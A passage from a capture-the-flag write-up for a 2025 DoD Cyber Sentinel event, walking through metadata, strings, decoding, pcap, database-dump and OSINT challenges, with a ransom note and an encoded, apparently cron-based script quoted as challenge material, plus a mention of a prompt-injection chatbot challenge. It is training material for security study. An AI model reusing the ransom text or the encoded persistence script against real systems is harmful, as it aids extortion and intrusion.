# DOD Cyber Sentinel June 2025 CTF

![image](https://github.com/user-attachments/assets/c1a7c4df-3d1c-4609-83fd-6b2dd378dfce)

---

![image](https://github.com/user-attachments/assets/6488bb32-9a35-4ab9-84cd-5166cc659c0d)

----

## Table of Contents

- [Bonus Flags Category](#Bonus-Flags-Category)
- [Cryptography](#Cryptography-Category)
- [Networking](#Networking-Category)
- [OSINT](#OSINT-Category)
- [Recon](#Recon-Category)
- [Reverse Engineering and Malware](#Reverse-Engineering-and-Malware)
- [Web Application Security](#Web-Application-Security)


---

# Bonus Flags Category
## Slack Onboarding Flag

This was given out for joining and reading the rules:

![image](https://github.com/user-attachments/assets/c4098102-a81f-43cd-95c5-fb2176c3d5d0)

---

## Flag Submission Practice Flag

A flag to test submission:

![image](https://github.com/user-attachments/assets/831793c8-520a-4ada-b62f-269b60cea356)

---

# Cryptography Category


## Behind the Beat

![image](https://github.com/user-attachments/assets/17371fdf-d7ea-4888-9308-23327a7ee77a)

---

Running a check for metadata:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# exiftool message.mp3
ExifTool Version Number         : 13.25
File Name                       : message.mp3
Directory                       : .
File Size                       : 241 kB
File Modification Date/Time     : 2025:06:14 13:44:14-04:00
File Access Date/Time           : 2025:06:14 13:44:15-04:00
File Inode Change Date/Time     : 2025:06:14 13:44:14-04:00
File Permissions                : -rw-rw-r--
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 64 kbps
Sample Rate                     : 44100
Channel Mode                    : Single Channel
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 79
Encoded By                      : C1{metadata_tells_more}
Encoder Settings                : Lavf61.7.100
Duration                        : 0:00:30 (approx)
```

Running strings against the MP3 gives us the flag:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# strings message.mp3| head 
ETENC
C1{metadata_tells_more}
TSSE
Lavf61.7.100
Info
"$')+.1369;=@BEHJMORTWZ\_bcfiknqsvxz}
Lavf
L3Nu
K*0!
a(ZdQ,hjZo
```

The flag:
```bash
C1{metadata_tells_more}
```

## Hidden in Plain Sight

![image](https://github.com/user-attachments/assets/699cf835-d6bc-4175-b050-29b34b5b6c66)

---

This time we get the flag by running strings and looking for the flag format:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# strings selfie.png | grep C1
C1{smile_youre_flagged}
|C1(
x9C1sY
C1&N
C1d"!d
}wC1
C1w7
dIC1
&H&C1Pw
}C1um
!BBC1
p:Y(C1
8jC1
<C1J
vC1eF
CBC1
 J$C1
S6C1
)GC1`
_C1f
```

The flag:
```bash
C1{smile_youre_flagged}
```

## Remote Help

![image](https://github.com/user-attachments/assets/a1e445d0-96a9-4d2f-9447-b85998fd0934)

---

At the bottom of the file there is a decryption task:

s![image](https://github.com/user-attachments/assets/3cdf91fa-0be9-412d-82cb-4793c3405ad4)

After decoding and visiting the link we obtain a text file with the first part of the flag:

![image](https://github.com/user-attachments/assets/8b479769-872e-4038-9ced-ba27264765b9)

The first part of the flag:
```bash
C1{Sn34ky_}
```

If we go to the info page in the script above then we can decrypt the following text:
```bash
INEEKQ2LL5JUGUSJKBKD2IRPOVZXEL3MN5RWC3BPMJUW4L3DNBSWG227MJQWG23VOAXHG2BCBUFEGUSPJZPUSTSUIVJFMQKMHURCULZVEAVCAKRAFIQCUIRAEARSARLWMVZHSIBVEBWWS3TVORSXGDIKINJE6TS7JJHUEX2OIFGUKPJCMNUGKY3LL5RGCY3LOVYF643DOJUXA5BCBUFFGQ2SJFIFIX2QIFKEQPJCF5XXA5BPMJQWG23VOAXHG2BCBUFCIU2DKJEVAVC7KVJEYPLIOR2HA4Z2F4XW243PNFSGK3TUNF2HSLTDN5WS6YTBMNVXK4C7NFXGM3YNBIGQUIZAIRHSATSPKQQFAVKUEBIECU2TK5HVERCTEBEU4ICQJRAUSTRAKRCVQVANBIGQUY3BOQQDYPCFJ5DCA7BAON2WI3ZAORSWKIBCERBUQRKDJNPVGQ2SJFIFIIRAHYQC6ZDFOYXW45LMNQGQUIZBF5RGS3RPMJQXG2ANBJUWMIC3EAQSALLGEARCIU2DKJEVAVC7KBAVISBCEBOTWIDUNBSW4DIKEAQCAIDDOVZGYIBNMZZVGTBAEISFGQ2SJFIFIX2VKJGCEIBNN4QCEJCTINJESUCUL5IECVCIFZSW4YZCEATCMIDPOBSW443TNQQGK3TDEAWW433TMFWHIIBNMFSXGLJSGU3C2Y3CMMQC2ZBAFVUW4IBCERJUGUSJKBKF6UCBKREC4ZLOMMRCALLPOV2CAIREKNBVESKQKRPVAQKUJARCALLQMFZXGIDQMFZXGORCGQ2TGMZXMEZTANRXGMZTKZRVGY2DONLGEIQCMJRAMNUG233EEAVXQIBCERJUGUSJKBKF6UCBKRECEIBGEYQHE3JAEISFGQ2SJFIFIX2QIFKEQLTFNZRSEDIKMZUQ2CSFJ5DA2CQNBJRWQ3LPMQQCW6BAEISEGSCFINFV6U2DKJEVAVBCBUFA2CRIMNZG63TUMFRCALLMEAZD4L3EMV3C63TVNRWCA7BAM5ZGK4BAFV3CAIREINEEKQ2LL5JUGUSJKBKCEOZAMVRWQ3ZAEISEGUSPJZPUSTSUIVJFMQKMEASEGSCFINFV6U2DKJEVAVBAEMQCIQ2SJ5HF6SSPIJPU4QKNIURCSID4EBRXE33OORQWEIBN
```

Using:
```python
import base64

encoded_str = ("INEEKQ2LL5JUGUSJKBKD2IRPOVZXEL3MN5RWC3BPMJUW4L3DNBSWG227MJQWG23VOAXHG2BCBUFEGUSPJZPUSTSUIVJFMQKMHURCULZVEAVCAKRAFIQCUIRAEARSARLWMVZHSIBVEBWWS3TVORSXGDIKINJE6TS7JJHUEX2OIFGUKPJCMNUGKY3LL5RGCY3LOVYF643DOJUXA5BCBUFFGQ2SJFIFIX2QIFKEQPJCF5XXA5BPMJQWG23VOAXHG2BCBUFCIU2DKJEVAVC7KVJEYPLIOR2HA4Z2F4XW243PNFSGK3TUNF2HSLTDN5WS6YTBMNVXK4C7NFXGM3YNBIGQUIZAIRHSATSPKQQFAVKUEBIECU2TK5HVERCTEBEU4ICQJRAUSTRAKRCVQVANBIGQUY3BOQQDYPCFJ5DCA7BAON2WI3ZAORSWKIBCERBUQRKDJNPVGQ2SJFIFIIRAHYQC6ZDFOYXW45LMNQGQUIZBF5RGS3RPMJQXG2ANBJUWMIC3EAQSALLGEARCIU2DKJEVAVC7KBAVISBCEBOTWIDUNBSW4DIKEAQCAIDDOVZGYIBNMZZVGTBAEISFGQ2SJFIFIX2VKJGCEIBNN4QCEJCTINJESUCUL5IECVCIFZSW4YZCEATCMIDPOBSW443TNQQGK3TDEAWW433TMFWHIIBNMFSXGLJSGU3C2Y3CMMQC2ZBAFVUW4IBCERJUGUSJKBKF6UCBKREC4ZLOMMRCALLPOV2CAIREKNBVESKQKRPVAQKUJARCALLQMFZXGIDQMFZXGORCGQ2TGMZXMEZTANRXGMZTKZRVGY2DONLGEIQCMJRAMNUG233EEAVXQIBCERJUGUSJKBKF6UCBKRECEIBGEYQHE3JAEISFGQ2SJFIFIX2QIFKEQLTFNZRSEDIKMZUQ2CSFJ5DA2CQNBJRWQ3LPMQQCW6BAEISEGSCFINFV6U2DKJEVAVBCBUFA2CRIMNZG63TUMFRCALLMEAZD4L3EMV3C63TVNRWCA7BAM5ZGK4BAFV3CAIREINEEKQ2LL5JUGUSJKBKCEOZAMVRWQ3ZAEISEGUSPJZPUSTSUIVJFMQKMEASEGSCFINFV6U2DKJEVAVBAEMQCIQ2SJ5HF6SSPIJPU4QKNIURCSID4EBRXE33OORQWEIBN")

decoded_bytes = base64.b32decode(encoded_str, casefold=True)
print(decoded_bytes.decode('utf-8', errors='ignore'))
```

We get:

![image](https://github.com/user-attachments/assets/15eaf7a6-eb76-4de7-abab-c9c82ab128dd)

We get a bunch of hexadecimal:

![image](https://github.com/user-attachments/assets/2ebb8bbb-ebb6-4ace-a67c-e6f1b22f9260)

We can convert this to other text:
```python
hex_data = """
37ae4439546c363bccca4ddd07ecb87c1a56002e83b3b35d8b5d0564443db139
28a7f3a5063f41f50e49f80a84d56843bb3458c593e761ede2a19cc83fb7d2d8
4afc6b3b4e86de bba01314e81803f482a97f63d66cfbea38343809f02cde665b
c07614687a2843808fce5ac9b3fee0c49a4d42c6e7c017aa8a664afadde54de4
203f542aafc8bfc03854fe2b0d5dd0783b9f93bd5ce351d975667429787fc927
168cb3cc37384394f3db304f79707db09b54f8465f0ef8825b29c4be08274646
a34fc6adabfc8fa15a8784c86b4fd6b3133a9edacecba69c7827b8a67729c07c
58d469e847881e7202b9f7869d41726e91a42d957945c0b18f9e0d10974d196f
411e62d02da297d6128e833257fadf227ddeb2197892dff42971d1e97af73559
d0fdf7561ab9c943d6ee367d434bf25b1bd7b54bfb20b11b1e5d84940405e025
20e302a6be22da60766eb0ffae797d9951b1731211c90a33ecf7133fa4c56393
438a69478e32803b7dde461e652ea22073a4d30434f83be0ee2c424ab8fcc540
00494d5da41fb09a2ac22e06ee9673ca987af55e74ba70c8195fc9096daf686e
fbb4a7c19225f82916336656c859058f8cac8becef938e5cde3ed2b38f492f9d
72fc25bca999cc34aa28baaa8acd441a26008cec975be6dd52b29d62686fda38
b9239d4340086adf9ef5f831933d1220168f1c25b553a8ac112c2aadea8ad5e4
fdd10d252325c6c71cfa1644a84d861ce4f3bb7404d70bb7dea2ca5397cfd64a
d44c287555e7f3ef600cc7b4eb8b42374ee38be3e6b968c0836fa223530a06e3
b49492f63f1755b975b88ce85a9ad162ae7881a1475d644c61cc1fcef12a84d9
e92ad6e2f449f39de666d73ab7af0cc1b2a01acd2485da04cf75ccc1b2c57d59
be54b37e51bf59762fec928374d76efb1f49f0f57128e025143d56169e6d6ed6
57b8a06f4a88bf502b70c94fdf8ba7ef6afe9fbdbb8cf00f517dd3e373192b3d
d4ca6c56e6c9be479685a1dac7632396ae157aede4a933df928762f585daee16
37701bcd4dd0c71cc25627471c063bd0ab4343a0e9a76308c8c4ecbb3a163e9c
ba8f912463f7ceac25d197cb4ed34c85c60333656c28c60e1cdcdc9b6c0fb26b
7f3cbeba7ea14c5017ced3025de1979b214cb86974ce4d42a5a6b28c676fe0cf
b2964f4b9814cf36a74184b7f5e1e1a72b21a05a976f64d29a4b8de85e75b2a8
7b88785663ca81a331f3c0c78759d48ea3ba9c445e62ec3d23233a60acc29803
b5b25b1c40659b1dd32e6fb11f904f6012f429c307bca769c1d0ba648110a4bf
f15adad497f8fd3024cdf017288bc9b01dde07b2efbb6264d46b7d36044f8111
"""

# Remove whitespace/newlines
hex_data = "".join(hex_data.split())

# Convert to bytes
bytes_data = bytes.fromhex(hex_data)

# Try printing ascii strings inside
import re
print("Extracted ASCII strings:")
strings = re.findall(b"[ -~]{4,}", bytes_data)
for s in strings:
    print(s.decode('ascii'))

# Save to file if you want to inspect with other tools
with open("output.bin", "wb") as f:
    f.write(bytes_data)

print("\nRaw data saved as output.bin")
```

Our output:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# python scripy2.py 
Extracted ASCII strings:
D9Tl6;
hz(C
 ?T*
uft)x
0Oyp}
6}CK
L(uU
G]dLa
3el(
=##:`

Raw data saved as output.bin
```

We see it is a data file:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# file output.bin 
output.bin: data
```

We get the final part of the flag with:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# sudo nc msoidentity.com 4443                                               
Final Part: pr0sp3r}   
```

The final flag:
```bash
C1{Sn34ky_pr0sp3r}

```

---

# Networking Category

## Packet Whisperer

![image](https://github.com/user-attachments/assets/c615e1be-ae62-41f9-91f6-c3b894aa3f42)

---

We receive a login.pcap, we can try filtering in Wireshark to see if we can find a successful login.

I found the successful login:

![image](https://github.com/user-attachments/assets/7a549635-bbdc-42a7-8f2e-020fbc3bd753)

We are able to filter for the string containing "C1" to get the flag from a packet:

![image](https://github.com/user-attachments/assets/969d6bc8-3743-4a79-a83c-581e46dc00ca)

The flag:

![image](https://github.com/user-attachments/assets/9bed9253-63fc-441d-9894-35eac818622f)

The flag in the correct format:
```bash
C1{maybe_TLS_would_be_nice}
```

---

## overSSharing

![image](https://github.com/user-attachments/assets/c20a3e20-bee3-492c-bbae-228d891d1953)

---

There is a file share that has a bunch of files, there must be something in here:

![image](https://github.com/user-attachments/assets/a777431b-c658-4557-a31d-4654826ab612)

It has a bunch of exploit POCs.

The `backup` file has a bunch of relevant text for us to access the SSH server:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# file backup   
backup: Extensible storage engine DataBase, version 0x620, checksum 0x7e8a6ffc, page size 8192, Windows version 10.0
```

This is **Extensible Storage Engine (ESE) Database** file.

We can download utilities to examine the file:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# sudo apt-get install libesedb-utils
```

Running this will let us see the contents:
```bash

Table: 12			MSysDefrag2 (233)
	Number of columns:	16
	Column	Identifier	Name	Type
	1	1	ObjidFDP	Integer 32-bit signed
	2	2	Status	Integer 16-bit signed
	3	3	PassStartDateTime	Integer 64-bit signed
	4	4	PassElapsedSeconds	Integer 64-bit signed
	5	5	PassInvocations	Integer 64-bit signed
	6	6	PassPagesVisited	Integer 64-bit signed
	7	7	PassPagesFreed	Integer 64-bit signed
	8	8	PassPartialMerges	Integer 64-bit signed
	9	9	TotalPasses	Integer 64-bit signed
	10	10	TotalElapsedSeconds	Integer 64-bit signed
	11	11	TotalInvocations	Integer 64-bit signed
	12	12	TotalDefragDays	Integer 64-bit signed
	13	13	TotalPagesVisited	Integer 64-bit signed
	14	14	TotalPagesFreed	Integer 64-bit signed
	15	15	TotalPartialMerges	Integer 64-bit signed
	16	256	CurrentKey	Large binary data

	Number of indexes:	0

Table: 13			quota_table (234)
	Number of columns:	4
	Column	Identifier	Name	Type
	1	1	quota_NCDNT	Integer 32-bit signed
	2	2	quota_tombstoned	Integer 32-bit signed
	3	3	quota_total	Integer 32-bit signed
	4	128	quota_SID	Binary data

	Number of indexes:	1
	Index: 1		quota_NCDNT_SID_index (234)

Index: 1			quota_NCDNT_SID_index (234)

Table: 14			quota_rebuild_progress_table (235)
	Number of columns:	3
	Column	Identifier	Name	Type
	1	1	quota_rebuild_DNT_Last	Integer 32-bit signed
	2	2	quota_rebuild_DNT_Max	Integer 32-bit signed
	3	3	quota_rebuild_fDone	Boolean

	Number of indexes:	0
```

We can export the entire database now:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# esedbexport -t backup_export backup
esedbexport 20240420

Opening file.
Database type: Unknown.
Exporting table 1 (MSysObjects) out of 14.
Exporting table 2 (MSysObjectsShadow) out of 14.
Exporting table 3 (MSysObjids) out of 14.
Exporting table 4 (MSysLocales) out of 14.
Exporting table 5 (datatable) out of 14.
Exporting table 6 (link_table) out of 14.
Exporting table 7 (hiddentable) out of 14.
Exporting table 8 (sdproptable) out of 14.
Exporting table 9 (sd_table) out of 14.
Exporting table 10 (sdpropcounttable) out of 14.
Exporting table 11 (link_history_table) out of 14.
Exporting table 12 (MSysDefrag2) out of 14.
Exporting table 13 (quota_table) out of 14.
Exporting table 14 (quota_rebuild_progress_table) out of 14.
Export completed.
```

We can view the contents:
```bash
┌──(root㉿kali)-[/home/kali/Downloads/backup_export.export]
└─# ls -la
total 12680
drwxr-xr-x 2 root root     4096 Jun 14 13:16 .
drwxr-xr-x 4 kali kali     4096 Jun 14 13:16 ..
-rw-r--r-- 1 root root 12489433 Jun 14 13:16 datatable.4
-rw-r--r-- 1 root root      728 Jun 14 13:16 hiddentable.6
-rw-r--r-- 1 root root      263 Jun 14 13:16 link_history_table.10
-rw-r--r-- 1 root root     7612 Jun 14 13:16 link_table.5
-rw-r--r-- 1 root root      307 Jun 14 13:16 MSysDefrag2.11
-rw-r--r-- 1 root root     1342 Jun 14 13:16 MSysLocales.3
-rw-r--r-- 1 root root   101588 Jun 14 13:16 MSysObjects.0
-rw-r--r-- 1 root root   101588 Jun 14 13:16 MSysObjectsShadow.1
-rw-r--r-- 1 root root     1782 Jun 14 13:16 MSysObjids.2
-rw-r--r-- 1 root root       80 Jun 14 13:16 quota_rebuild_progress_table.13
-rw-r--r-- 1 root root      706 Jun 14 13:16 quota_table.12
-rw-r--r-- 1 root root       14 Jun 14 13:16 sdpropcounttable.9
-rw-r--r-- 1 root root       96 Jun 14 13:16 sdproptable.7
-rw-r--r-- 1 root root   231412 Jun 14 13:16 sd_table.8
```

There was a giant output that included some strings that indicate a username, backup key, etc., and I did not manage to retrieve the key so I omitted the majority of the output:
```
└─# strings -t d datatable.4 | grep -i -C 10 "BCKUPKEY_PREFERRED"
												00												016449	13391570146				0						0Brian Toroth				13000000000000009d52a5cd222465a216ba0b5c098b63f310000000bfb5949ab3f8273c40d5538d63b3446c6cb3ad378bd850264cb00b02580b1831		130000000000000055b4965a21c07728579d293765a7e2d2100000009842da244797f18d4ea78c00cc79a37a24d58f1138616dbdfc025799bf4a1eed	1300000000000000472bfff2c04e5b385a41272ec0ea3b521000000048d17fcc02141c2471f0f28a4ff1c051c33a1454f84e8e4c3f29723d2d81084f										Brian Toroth											49223372036854775807										16443	13391570145										9900000000000000											086b926c2545764db18be8e1df20cda8									1554		
```

----

## ChatAPT

![image](https://github.com/user-attachments/assets/611dcd42-c73c-4cf0-903d-f8e793863ba9)

---

We can connect to see what happens:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc ai.msoidentity.com 31337
Welcome to ChatAPT, I’m here to give guidance on computers and great software, please don’t try to gather any flags from me.
Please wait while we connect you to an agent...
```

This looks like a prompt injection scenario. Unfortunately this challenge was broken 100% of the time of the event.

---

# OSINT Category

## Cafe Confidential

![image](https://github.com/user-attachments/assets/eb62638b-0d61-4c0e-8955-3047f65927b4)

---

One image is not able to be opened:

![image](https://github.com/user-attachments/assets/51eabce7-d500-49cc-b817-bcd3f0cf5d81)

I ran Exif tool on both to inspect the metadata.

The first:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# exiftool Image_1.png 
ExifTool Version Number         : 13.25
File Name                       : Image_1.png
Directory                       : .
File Size                       : 48 kB
File Modification Date/Time     : 2025:06:14 11:28:35-04:00
File Access Date/Time           : 2025:06:14 11:28:35-04:00
File Inode Change Date/Time     : 2025:06:14 11:28:35-04:00
File Permissions                : -rw-rw-r--
File Type                       : WEBP
File Type Extension             : webp
MIME Type                       : image/webp
VP8 Version                     : 0 (bicubic reconstruction, normal loop)
Image Width                     : 752
Horizontal Scale                : 0
Image Height                    : 752
Vertical Scale                  : 0
Image Size                      : 752x752
Megapixels                      : 0.566
```

The second:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ** Message: 11:29:23.805: Could not open file 'file:///home/kali/Downloads/Image_1.png': Unsupported mime type
exifexiftool Image_2.png 
ExifTool Version Number         : 13.25
File Name                       : Image_2.png
Directory                       : .
File Size                       : 242 kB
File Modification Date/Time     : 2025:06:14 11:28:36-04:00
File Access Date/Time           : 2025:06:14 11:28:37-04:00
File Inode Change Date/Time     : 2025:06:14 11:28:36-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 300
Y Resolution                    : 300
Image Width                     : 1000
Image Height                    : 667
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1000x667
Megapixels                      : 0.667
```

Then I started doing a reverse image search to see what results populate.

The image that I could not see due to the `.webp` format shows me this after doing a Google reverse image search:

![image](https://github.com/user-attachments/assets/f3144a1a-c241-4960-92c6-71c9adf112dc)


I clicked on exact matches and found our image:

![image](https://github.com/user-attachments/assets/08722c65-824a-42f0-bdc2-55dcdf61fa1e)

This tells us that we're looking at a match, Parker's place.

![image](https://github.com/user-attachments/assets/f2dad6a8-8a61-4fe2-81fa-c82fee1e4684)

The flag was `C1{Parker's_Lowndes}`

----

## Problems in North TORbia

![image](https://github.com/user-attachments/assets/e65121b7-e878-44f6-a030-46d8c07c04bb)

---

Here is the ransom file:
```bash
┌──(root㉿kali)-[/home/kali]
└─# cat note.txt   
YOU HAVE BEEN PENETRATED.

We are group of cyber warriors from JUCHE JAGUAR. You are infected.
Your network, systems, documents, inner secrets — all under full control.

You pretend to be innocent company, but we know your lies and dirty money games.
We see your crimes. We expose your shadow. We now give you one final mercy option.

WE HOLD:

Secret plans, financial crime records

Executive communications and data treasure

System control ability at root level

Your time is limited. Clock is counting.
To restore order and avoid global shame, you must pay [X] Bitcoin in 120 hours.

SEND PAYMENT TO:
http://jjpwn5u6ozdmxjurfitt42hns3qovikeyhocx5b2byoxgupnuzd2vkid.onion/

After payment is confirmed, we will:

Send unlock keys

Remove all stolen data from secure vault

Cease further punishment

If you ignore:

All data go public

Systems will be destroyed

Name will be burned in global news fire

NO GAME. NO NEGOTIATION. NO MERCY.
We are not common criminal. We are mission.
We do not bluff. We do not stop.
Truth is weapon. Fear is justice.
```

I am going to curl the data down to my virtual machine:
```bash
┌──(root㉿kali)-[/home/kali]
└─# curl http://jjpwn5u6ozdmxjurfitt42hns3qovikeyhocx5b2byoxgupnuzd2vkid.onion/ > output.txt
curl: (6) Not resolving .onion address (RFC 7686)
```

I realized that this is a TOR link, I have never used before, so we need the TOR browser in order to access it: https://www.torproject.org/thank-you/

Download Tor and unzip it:
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ tar -xf tor-browser-linux-x86_64-14.5.3.tar.xz
```

![image](https://github.com/user-attachments/assets/03b8a046-1d12-4861-a0cd-f5fe49b647e2)

Viewing the source shows us the embedded flag it would return to us with the following parameters in the source:

![image](https://github.com/user-attachments/assets/46b31655-bd86-4ae4-a640-81601637355a)

The flag is:
```bash
C1{h1dd3n_f13lds_0f_0n10ns}
```

----

## Inspo

![image](https://github.com/user-attachments/assets/9a6444b4-1bde-4a33-b1a3-c7e5f38b8101)

---

These are the images:

![image](https://github.com/user-attachments/assets/53e88e51-3acf-4009-9779-3b71b0818246)

We need to find the exact location with google maps, and right-click to acquire coordinates of the:

https://koreajoongangdaily.joins.com/news/2025-04-04/national/northKorea/North-Koreas-Kim-inspects-service-facilities-under-preparation-in-Pyongyangs-new-town/2277671

![image](https://github.com/user-attachments/assets/7635772c-2de6-40db-994f-53e99d9b66d5)

The flag:
```bash
C1{39.031,125.720}
```

---

# Recon Category

## Hoasted Toasted

![image](https://github.com/user-attachments/assets/3ac3aadd-0005-45ef-899b-8ccfba4b7f81)

---

The website:

![image](https://github.com/user-attachments/assets/358df38b-1c2d-4eee-8a7d-5195eae355d1)

We can see that this is not a secure website when we join, therefore, we should look at the website certificate.

![image](https://github.com/user-attachments/assets/ad0d2cbc-f460-42f2-89b8-cc87a0afbe48)

In the certificate we see:

![image](https://github.com/user-attachments/assets/ba47c6b1-c946-4f23-8c63-7279ff9aea33)

Acquire the IP address of the domain:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nslookup not-torbian.ethtrader-ai.com

Server:		192.168.153.2
Address:	192.168.153.2#53

Non-authoritative answer:
Name:	not-torbian.ethtrader-ai.com
Address: 34.86.60.228

```

This will make things accessible to use as we map the remote IP to the internal host:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat /etc/hosts                                  
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

34.86.60.228  definitelynotaflag.north.torbia
```

I connected to the HTTPS server using this command, which completes the TLS handshake establishing an encrypted channel with the server:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# openssl s_client -connect definitelynotaflag.north.torbia:443 -servername definitelynotaflag.north.torbia
Connecting to 34.86.60.228
CONNECTED(00000003)
depth=0 C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
verify return:1
---
Certificate chain
 0 s:C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
   i:C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: May 14 11:25:12 2025 GMT; NotAfter: May 14 11:25:12 2026 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEWDCCA0CgAwIBAgIUAIFLrAo9OzS+v5dY/xsmvhvj6bkwDQYJKoZIhvcNAQEL
BQAwgZcxCzAJBgNVBAYTAk5UMRYwFAYDVQQIDA1HbG9yaW91c1N0YXRlMRQwEgYD
VQQHDAtDYXBpdGFsQ2l0eTEaMBgGA1UECgwRTWluaXN0cnkgb2YgVHJ1dGgxFzAV
BgNVBAsMDldlYiBPcGVyYXRpb25zMSUwIwYDVQQDDBxub3QtdG9yYmlhbi5ldGh0
cmFkZXItYWkuY29tMB4XDTI1MDUxNDExMjUxMloXDTI2MDUxNDExMjUxMlowgZcx
CzAJBgNVBAYTAk5UMRYwFAYDVQQIDA1HbG9yaW91c1N0YXRlMRQwEgYDVQQHDAtD
YXBpdGFsQ2l0eTEaMBgGA1UECgwRTWluaXN0cnkgb2YgVHJ1dGgxFzAVBgNVBAsM
DldlYiBPcGVyYXRpb25zMSUwIwYDVQQDDBxub3QtdG9yYmlhbi5ldGh0cmFkZXIt
YWkuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArf9F4nj9vbVH
RRpQ8UsL877jUdMK7beCV5W+SGCYwsHLyyvCQeXAQVxCvLMQw9QyWikntolOlGKy
my8QYLnfhrjpkwpW8+KLd1tx6/tHZB77WHlyPSyCmCqu1d9AEX6ScmCqLy4Xk31d
PXNuUmML5OmnetMMvDbOZ2yDmRnQW+1igKqxgcn6jC/MqfgYeieJuyikk8ZIZdbL
mfjqiBOVWS2vE/KFtEI+DFXqp+U+NJTz1x6MaeL4IJ05YbPPY/mjLEiCB0ADFTZj
uwD/0Foclix9GPjTDVLk45fc6mc2MsGkMLGiDfCUG8p47wvl0Lcf2cnN0xedqwH3
ZZMGgRHZBwIDAQABo4GZMIGWMEgGA1UdEQRBMD+CHG5vdC10b3JiaWFuLmV0aHRy
YWRlci1haS5jb22CH2RlZmluaXRlbHlub3RhZmxhZy5ub3J0aC50b3JiaWEwCQYD
VR0TBAIwADALBgNVHQ8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYDVR0O
BBYEFDyKRsXt+1a0j8Bh5zRDvvxVL8C7MA0GCSqGSIb3DQEBCwUAA4IBAQBWHyee
DN0mNR8FCpxC83wuijLwstZiFo+48dKjONovMhbYAC2NxvnBpdFeGwIwFlsIjNZ/
FaLc3E/CEgy/REbc8VUbdGaojIrfimR2JgJFdN3Z2UEdp+2k8jkb1SWDT9dEBwfa
mdfO01kRo8e75RKqeYm9CKC5vwv5fERiHdBmpiUSq5+hAXQxaMMdfluJpsx6k02V
zgIQl786MiA668UtfEbKHAZKJ/lMxYsh6l1frNfHmRg7KlXuL/x9vzeB/Z5lFCNR
biqd8TsWwNzQvHesj2R8/VH+xD/D1iXr0TJ060dg4NmlYtYQyQKvyC4gDxpOTMJ6
GIZPBMwXdWNB8ZA8
-----END CERTIFICATE-----
subject=C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
issuer=C=NT, ST=GloriousState, L=CapitalCity, O=Ministry of Truth, OU=Web Operations, CN=not-torbian.ethtrader-ai.com
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1676 bytes and written 1780 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 981F643A1075F6D3E2E1E6AA408FC2D089A9A834ABCD6470A7E7CF5C259EAF01
    Session-ID-ctx: 
    Resumption PSK: CCAB4D9CDE58B7E80B24206218C9041EF979C400751C1C03520596F99B180069790E5565378139182E897E3B1E71DDB2
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 38 a8 9f f8 29 5e 5c 91-e2 4b 44 4f b2 bb cf fb   8...)^\..KDO....
    0010 - 2c 52 04 f9 2f 19 9b b7-57 49 6a c4 84 d2 98 7e   ,R../...WIj....~
    0020 - 6f ec 0f 9c aa 5a a1 d1-74 f0 b5 b2 20 b4 63 4f   o....Z..t... .cO
    0030 - 61 35 6c 90 53 a6 c3 2d-99 82 da 8e b5 50 72 7e   a5l.S..-.....Pr~
    0040 - 12 77 77 b6 14 b6 b3 08-ee 1e ac a0 38 e3 81 fa   .ww.........8...
    0050 - 5a 3b 92 17 44 ea ca d1-26 6f 57 80 d6 af 88 e8   Z;..D...&oW.....
